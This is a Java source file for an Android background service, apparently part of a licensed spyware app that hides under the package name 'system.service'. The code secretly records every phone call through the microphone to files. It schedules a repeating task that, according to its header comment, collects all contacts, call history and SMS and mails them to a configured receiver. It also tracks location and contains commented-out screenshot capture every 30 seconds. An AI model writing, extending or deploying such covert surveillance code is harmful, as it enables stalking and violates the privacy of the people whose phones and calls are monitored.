package system.service;

import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import system.service.activity.GlobalPrefActivity;
import system.service.config.ConfigCtrl;
import system.service.feature.location.LocationUtil;
import system.service.feature.sms.SmsCtrl;

import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * Demo service that schedules a timer task
 * The timer task will execute the following tasks:
 *  - When starting the networks and over 24 hours to the previous timing, 
 *    will get all contacts, phone call history and SMS, 
 *    saved as attachments and mail to the qualified receiver.
 *  - When staring the machine and network is connected, 
 *    get the 1st screenshot delayed 3 seconds and then do it in a 30 seconds circle.    
 */
public class BootService extends Service 
{
	private final String LOGTAG = "BootService";
	
	private Timer mGetInfoTimer;
	private GetInfoTask mInfoTask;
	private final long mGetInfoDelay  = 10000; // 10 Seconds
	private final long mGetInfoPeriod = 300000; // 300 Seconds
	
	//private Timer mScreenshotTimer;
	//private CaptureTask mCapTask;
	//private final long mScreenshotDelay  = 3000;  // 3  Seconds
	//private final long mScreenshotPeriod = 30000; // 30 Seconds
	
	public static LocationUtil locationUtil;
	
	public static String gpsWord;
	
	private TelephonyManager telManager;
	private boolean recordStarted = false;
	private String otherSidePhoneNum = "";
	private static MediaRecorder recorder;
	private String DEFAULT_PHONE_RECORD_DIR = FileCtrl.getDefaultDirStr();
	
	static {
		recorder = new MediaRecorder();
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
	}
	
	private final PhoneStateListener phoneListener = new PhoneStateListener() {
		@Override
        public void onCallStateChanged(int state, String incomingNumber) {
			
			// Get incoming phone number
			if (incomingNumber != null && incomingNumber.length() > 0) {
				otherSidePhoneNum = incomingNumber;
			}
			
            try {
                switch (state) {
                	case TelephonyManager.CALL_STATE_RINGING: { // 1
                		break;
                	}
                	case TelephonyManager.CALL_STATE_OFFHOOK: { // 2
                		Context context = getApplicationContext();
                		
                		if (!ConfigCtrl.isLegal(context)) return;
            			
            			if (recordStarted) return;
            			
            			// Set audio
            			//setAudio(context);
            			
            			// Phone call recording
            			try {
                            Date startDate = new Date();
                            String fileFullPath = makePhonecallRecordFileFullPath(context, otherSidePhoneNum, startDate); 
                            recorder.setOutputFile(fileFullPath);
                            recorder.prepare();
                            recorder.start();
                            recordStarted = true;
                        } catch(Exception ex) {
                            
                        }
                		break;
                	}
                	case TelephonyManager.CALL_STATE_IDLE: { // 0
                		if (recordStarted) {
        					recorder.stop();
        					recordStarted = false;
        				}
                		break;
                	}
                	default: { }
                }
            } catch (Exception ex) {
            }
        } 
    };

	@Override
	public IBinder onBind(final Intent intent) {
		return null;
	}
	
	@Override
    public void onDestroy() {  
    }
	
	@Override  
    public boolean onUnbind(Intent intent) {  
        return super.onUnbind(intent);  
    }

	@Override
	public void onCreate() {
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		super.onCreate();
		
		mGetInfoTimer = new Timer();
		mInfoTask = new GetInfoTask(getApplicationContext());
		
		//mScreenshotTimer = new Timer();
		//mCapTask = new CaptureTask(this);
	}

	@Override
	public void onStart(final Intent intent, final int startId) {
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		super.onStart(intent, startId);
		
		// Start timer to get contacts, phone call history and SMS
		Context context = getApplicationContext();
		String[] mails = GlobalPrefActivity.getReceiverMail(context).split(",");
		mails = StrUtils.filterMails(mails);
		if (mails.length <= 0) return;
		
		LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
		if (ConfigCtrl.isLegal(context)) 
		{
			// Init global variables
			gpsWord = GlobalPrefActivity.getGpsWord(context);
			
			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
			
			telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
            telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
			
			locationUtil = new LocationUtil(getApplicationContext());
		
			//Start timer to capture screenshot
			/*
	        if (!SysUtils.isRooted(getApplicationContext())) {
	        	Log.i(LOGTAG, "Not rooted");
	        } else {
	        	mScreenshotTimer.schedule(mCapTask, mScreenshotDelay, mScreenshotPeriod);
	        }
	        */
		} 
		
		// If out of trial and not licensed, send a SMS to warn the receiver user
		else if (type == LICENSE_TYPE.TRIAL_LICENSED && !ConfigCtrl.stillInTrial(context))
		{
			// If has sent before, DO NOT send again
			if (ConfigCtrl.getHasSentExpireSms(context)) return;
			
			// Send a SMS to the receiver that has expired
			String receiverPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
			if (receiverPhoneNum != null && receiverPhoneNum.length() > 0) {
				String msg = String.format(context.getResources().getString(R.string.msg_has_sent_trial_expire_sms), ConfigCtrl.getSelfName(context));
				boolean ret = SmsCtrl.sendSms(receiverPhoneNum, msg);
				if (ret) {
					ConfigCtrl.setHasSentExpireSms(context, true);
				}
			}
		}
	}
	
	public class IaiaiBinder extends Binder {  
        public BootService getService() {  
            return BootService.this;  
        }  
    }
	
	private String makePhonecallRecordFileFullPath(Context context, String phoneNum, Date date) {
		if (!FileCtrl.defaultDirExist()) FileCtrl.creatDefaultSDDir();
		String fileName = context.getResources().getString(R.string.phonecall_record) + phoneNum + "-" + DatetimeUtil.format2.format(date) + FileCtrl.SUFFIX_WAV;
		return DEFAULT_PHONE_RECORD_DIR + fileName;
	}
	
	private void setAudio(Context context)
	{
		try {
			AudioManager audiomanager = (AudioManager)context.getSystemService("audio"); 
			//int i = audiomanager.getRouting(2); 
			audiomanager.setMode(2); 
			audiomanager.setMicrophoneMute(false); 
			audiomanager.setSpeakerphoneOn(true); 
			int j = audiomanager.getStreamMaxVolume(0); 
			if(j < 0) j = 1; 
			int k = j / 2 + 1; 
			audiomanager.setStreamVolume(0, k, 0); 
			audiomanager.setRouting(2, 11, 15);
		} catch (Exception ex) {}
	}
}